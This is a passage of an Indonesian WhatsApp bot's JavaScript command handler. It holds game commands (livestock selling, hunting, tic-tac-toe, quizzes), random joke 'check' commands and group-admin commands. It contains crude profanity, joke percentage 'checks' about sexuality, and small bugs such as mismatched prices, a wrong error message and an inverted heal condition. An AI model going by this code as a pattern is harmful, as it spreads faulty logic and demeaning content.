  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Domba kamu* : ${getDomba(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'sapi'){
 if (isSapi < anu) return m.reply('Sapi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} sapi 2\n 1 sapi = 10000 monay`)
 kurangSapi(m.sender, anu)
 let monaynya = 10000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Sapi kamu* : ${getSapi(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'gajah'){
 if (isGajah < anu) return m.reply('Gajah kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} gajah 2\n 1 gajah = 15000 monay`)
 kurangGajah(m.sender, anu)
 let monaynya = 15000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Gajah kamu* : ${getGajah(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'besi'){
 if (isBesi < anu) return m.reply('Besi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} besi 2\n 1 besi = 15000 monay`)
 kurangBesi(m.sender, anu)
 let monaynya = 16000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa Besi kamu* : ${getBesi(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'emas'){
 if (isEmas < anu) return m.reply('Besi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} emas 2\n 1 emas = 50000 monay`)
 kurangEmas(m.sender, anu)
 let monaynya = 50000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa emas kamu* : ${getEmas(m.sender)}`)
  }, 2000) 
 } else
 if (args[0] === 'emerald'){
 if (isEmerald < anu) return m.reply('Besi kamu tidak mencukupi untuk transaksi ini')
 if (!args[1]) return m.reply(`Example : ${prefix + command} emerald 2\n 1 emerald = 100000 monay`)
 kurangEmerald(m.sender, anu)
 let monaynya = 100000 * anu
 addMonay(m.sender, monaynya)
  setTimeout( () => {
  m.reply(`Transaksi berhasil ✔️\n*Monay kamu* : ${getMonay(m.sender)}\n*Sisa emerald kamu* : ${getEmerald(m.sender)}`)
  }, 2000) 
 } else { m.reply("Format salah!") }

 }
 break

 case 'heal':{
if (q.includes('--help')) return m.reply(examkosong) 
 if (!isCekDarah < 1) return m.reply('Kamu hanya bisa heal ketika darah kamu 0')
 if (isCekDarah > 100) return m.reply('Darah kamu sudah penuh')
 if (isPotion < 1) return m.reply('Kamu tidak punya potion, cobalah beli dengan cara #buypotion _jumlah_') 
 addDarah(m.sender, 100)
 kurangPotion(m.sender, 1)
 m.reply('Berhasil, darah kamu sudah full')
 }
 break
 case 'berburu':{
if (q.includes('--help')) return m.reply(examkosong) 
 //Peringatan!!!!, ini buatan rifza. jangan claim punya lu:)
 if (!isDarah){ addInventoriDarah(m.sender, DarahAwal) }
 if (isCekDarah < 1) return m.reply('Darah kamu habis, cobalah heal menggunakan potion') 
 if (!isInventoriBuruan){ addInventoriBuruan(m.sender) } 
  let luka = ["Tertusuk duri saat berburu","Terpeleset ke jurang saat berburu","Tercakar hewan buas","Tidak berhati-hati","Terjerat akar","Terjatuh saat berburu"]
  let location = ["Hutan rimba","Hutan Amazon","Hutan tropis","Padang rumput","Hutan afrika","Pegunungan"]
   var ikanmu = Math.ceil(Math.random() * 10)
   var ayam = Math.ceil(Math.random() * 8)
   var kelinci = Math.ceil(Math.random() * 7)
   var dombanya = [3,0,4,0,5,4,6,0,1,0,2,3,0,3,0,1]
   var sapinya = [2,0,3,0,4,0,5,0,1,0,2,0,3,0,1]
   var gajahnya = [1,0,4,0,2,0,1,0,2,1,3,0,1]
   var domba = dombanya[Math.floor(Math.random() * dombanya.length)] 
   var sapi = sapinya[Math.floor(Math.random() * sapinya.length)] 
   var gajah = gajahnya[Math.floor(Math.random() * gajahnya.length)]    
   var lukanya = luka[Math.floor(Math.random() * luka.length)]
   var lokasinya = location[Math.floor(Math.random() * location.length)]
 if (lokasinya === 'Hutan rimba') {
    var image = './storage/image/rimba.jpg'
   } else
 if (lokasinya === 'Hutan Amazon') {
    var image =  './storage/image/amazon.jpg'
   } else
 if (lokasinya === 'Hutan tropis') {
    var image = './storage/image/tropis.jpg'
   } else
 if (lokasinya === 'Padang rumput') {
    var image = './storage/image/padang_rumput.jpg'
   } else
 if (lokasinya === 'Hutan afrika') {
    var image = './storage/image/afrika.jpg'
   } else
 if (lokasinya === 'Pegunungan') {
   var image = './storage/image/pegunungan.jpg'
   }
 setTimeout( () => {
  let teksehmazeh = `_[ HASIL BURUAN ]_\n`
     teksehmazeh += `*🐟Ikan* : ${ikanmu}\n`
     teksehmazeh += `*🐔Ayam* : ${ayam}\n`
     teksehmazeh += `*🐇Kelinci* : ${kelinci}\n`
     teksehmazeh += `*🐑Domba* : ${domba}\n`
     teksehmazeh += `*🐄Sapi* : ${sapi}\n`
     teksehmazeh += `*🐘Gajah* : ${gajah}\n\n`
     teksehmazeh += `_[ INFO ]_\n`
     teksehmazeh += `*Lokasi* : ${lokasinya}\n`
     teksehmazeh += `*Terluka* : ${lukanya}, darah - 10\n`
     teksehmazeh += `*Sisa darah* : ${getDarah(m.sender)}\n`
    let buttons = [
      {
       buttonId: `${prefix + command}`, 
       buttonText: {
        displayText: 'Berburu lagi️🏹'
      }, type: 1},
    ]
    let buttonMessage = {
      image: { url: image },
      caption: teksehmazeh,
      footer: pushname,
      buttons: buttons,
      headerType: 4
     }
     zaki.sendMessage(from, buttonMessage, { quoted: m })      
  }, 5000)  
 setTimeout( () => {
  m.reply(`@${m.sender.split("@")[0]} Mulai berburu di ${lokasinya}`)     
  }, 1000) 
 addIkan(m.sender, ikanmu) 
   addAyam(m.sender, ayam) 
   addKelinci(m.sender, kelinci)
   addDomba(m.sender, domba)
   addSapi(m.sender, sapi)
  addGajah(m.sender, gajah)
 kurangDarah(m.sender, 10)
 }
 break
 //Nah Udah
	    
        case 'ttc': case 'ttt': case 'tictactoe': {
            let TicTacToe = require("./lib/tictactoe")
            this.game = this.game ? this.game : {}
            if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
            let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
            if (room) {
            m.reply('Partner ditemukan!')
            room.o = m.chat
            room.game.playerO = m.sender
            room.state = 'PLAYING'
            let arr = room.game.render().map(v => {
            return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
            }[v]
            })
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
            if (room.x !== room.o) await zaki.sendText(room.x, str, m, { mentions: parseMention(str) } )
            await zaki.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
            game: new TicTacToe(m.sender, 'o'),
            state: 'WAITING'
            }
            if (text) room.name = text
            m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
            this.game[room.id] = room
            }
            }
            break
            case 'delttc': case 'delttt': {
            this.game = this.game ? this.game : {}
            try {
            if (this.game) {
            delete this.game
            zaki.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
            } else if (!this.game) {
            m.reply(`Session TicTacToe🎮 tidak ada`)
            } else throw '?'
            } catch (e) {
            m.reply('rusak')
            }
            }
            break
            case 'suitpvp': case 'suit': {
            this.suit = this.suit ? this.suit : {}
            let poin = 10
            let poin_lose = 10
            let timeout = 60000
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
	    if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
            if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
            if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
            let id = 'suit_' + new Date() * 1
            let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
            this.suit[id] = {
            chat: await zaki.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: 'wait',
            waktu: setTimeout(() => {
            if (this.suit[id]) zaki.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    zaki.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    zaki.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    zaki.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    zaki.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    zaki.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    zaki.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    zaki.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await zaki.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6.lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await zaki.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    zaki.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zaki.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zaki.user.name, m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zaki.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zaki.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zaki.user.name, m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zaki.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zaki.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zaki.user.name, m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zaki.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zaki.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zaki.user.name, m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zaki.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zaki.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zaki.user.name, m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    zaki.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    zaki.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, zaki.user.name, m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./lib/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                zaki.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, jawab, zaki.user.name, m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'Jodohku' }, type: 1 }
                    ]
                    await zaki.sendButtonText(m.chat, buttons, jawab, zaki.user.name, m, {mentions: menst})
            }
            break
            case 'apakah':
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
					const kah = apa[Math.floor(Math.random() * apa.length)]
zaki.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })

					break
case 'bisakah':
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
					const ga = bisa[Math.floor(Math.random() * bisa.length)]
zaki.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })

					break
case 'bagaimanakah':
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
					const ya = gimana[Math.floor(Math.random() * gimana.length)]
zaki.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })

					break
case 'rate':
 
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
					const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
zaki.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })

					break
case 'gantengcek':
  case 'cekganteng':
   
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} flob`)
					const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
zaki.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })

					break
case 'cantikcek':
  case 'cekcantik':
   
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} flob`)
					const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const tik = can[Math.floor(Math.random() * can.length)]
zaki.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })

					break
case 'sangecek':
  case 'ceksange':
    case 'gaycek':
      case 'cekgay':
        case 'lesbicek':
          case 'ceklesbi':
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
					const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
zaki.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })

					break
case 'kapankah':
				if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
zaki.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
					break
case 'wangy':
              if (!q) return reply (`Contoh : .wangy Riy`)
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
             m.reply(awikwok)
              break
case 'cekmati':
              if (!q) return reply(`Invalid!\n\nYg mau di cek siapa kontol?`)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              m.reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                zaki.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                load(`Loading...`)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await zaki.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await zaki.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n➣ Packname : ${global.packname}\n➣ Author : ${global.author}`)
            }
            break
       

	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await zaki.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await zaki.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await zaki.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await zaki.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
